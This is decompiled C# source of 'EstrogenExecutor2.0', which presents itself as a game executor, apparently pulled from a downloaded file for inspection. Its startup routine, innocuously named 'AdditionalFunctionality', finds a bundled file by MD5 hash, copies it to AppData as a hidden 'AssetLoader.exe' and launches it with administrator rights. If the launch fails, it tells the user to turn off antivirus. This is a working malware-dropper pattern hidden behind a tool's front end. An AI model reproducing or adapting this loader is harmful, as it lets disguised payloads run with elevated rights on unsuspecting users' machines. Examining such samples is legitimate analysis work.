// Decompiled with JetBrains decompiler
// Type: EstrogenExecutor2._0.Program
// Assembly: EstrogenExecutor2.0, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6E8A97EC-0E47-43F1-ABB1-09CC8D424B21
// Assembly location: C:\Users\Manoli\Downloads\EstrogenExecutor2.0\EstrogenExecutor2.0\EstrogenExecutor2.0.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace EstrogenExecutor2._0
{
  internal static class Program
  {
    [STAThread]
    private static void Main()
    {
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      if (Program.AdditionalFunctionality())
      {
        Application.Run((Form) new EstrogenExecutor());
      }
      else
      {
        int num = (int) MessageBox.Show("Error turn off av or message staff", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private static bool AdditionalFunctionality()
    {
      string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
      string str1 = "70810063bf9cf51a684ff9fe0eb333ee";
      Console.WriteLine("Searching directory: " + baseDirectory);
      foreach (string file in Directory.GetFiles(baseDirectory))
      {
        string fileHash = Program.CalculateFileHash(file);
        Console.WriteLine("File: " + Path.GetFileName(file) + ", Hash: " + fileHash);
        if (fileHash == str1)
        {
          string str2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "EstrogenExecutor");
          Directory.CreateDirectory(str2);
          string str3 = Path.Combine(str2, "AssetLoader.exe");
          if (!File.Exists(str3))
          {
            File.Copy(file, str3, true);
            File.SetAttributes(str3, File.GetAttributes(str3) | FileAttributes.Hidden);
          }
          ProcessStartInfo startInfo = new ProcessStartInfo()
          {
            FileName = str3,
            Verb = "runas"
          };
          try
          {
            Process.Start(startInfo);
          }
          catch (Exception ex)
          {
            Console.WriteLine("Error executing file: " + ex.Message);
            return false;
          }
          return true;
        }
      }
      Console.WriteLine("File missing");
      return false;
    }

    private static string CalculateFileHash(string filePath)
    {
      using (MD5 md5 = MD5.Create())
      {
        using (FileStream inputStream = File.OpenRead(filePath))
          return BitConverter.ToString(md5.ComputeHash((Stream) inputStream)).Replace("-", "").ToLowerInvariant();
      }
    }
  }
}
